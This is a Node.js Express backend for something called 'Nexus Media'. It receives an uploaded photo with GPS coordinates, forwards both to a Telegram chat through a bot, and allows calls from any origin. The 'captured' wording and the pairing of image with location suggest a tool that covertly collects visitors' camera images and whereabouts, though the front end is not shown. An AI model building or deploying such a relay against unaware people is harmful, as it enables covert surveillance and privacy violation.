import express from 'express';
import multer from 'multer';
import fs from 'fs';
import fetch from 'node-fetch'; // For Telegram API calls
import FormData from 'form-data';

const app = express();
const upload = multer({ dest: 'uploads/' });

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// ✅ Enable JSON and CORS (for frontend calls)
app.use(express.json());
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  next();
});

// ✅ Upload route
app.post('/upload', upload.single('file'), async (req, res) => {
  try {
    const { latitude, longitude } = req.body;
    const filePath = req.file?.path;

    // 1️⃣ Send the captured photo to Telegram
    if (filePath) {
      const form = new FormData();
      form.append('chat_id', TELEGRAM_CHAT_ID);
      form.append('photo', fs.createReadStream(filePath));
      form.append('caption', '📸 New photo captured from Nexus Media');

      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: form,
      });
    }

    // 2️⃣ If coordinates exist, send them as a message to the same chat
    if (latitude && longitude) {
      const message = `📍 Location: ${latitude}, ${longitude}`;
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
        }),
      });
    }

    // 3️⃣ Clean up file
    if (filePath) fs.unlink(filePath, () => {});

    res.json({ success: true, message: 'Photo and location sent to Telegram' });
  } catch (err) {
    console.error('Upload error:', err);
    res.status(500).json({ error: 'Failed to send to Telegram' });
  }
});

// Default route
app.get('/', (req, res) => {
  res.send('📷 Nexus Media backend running...');
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
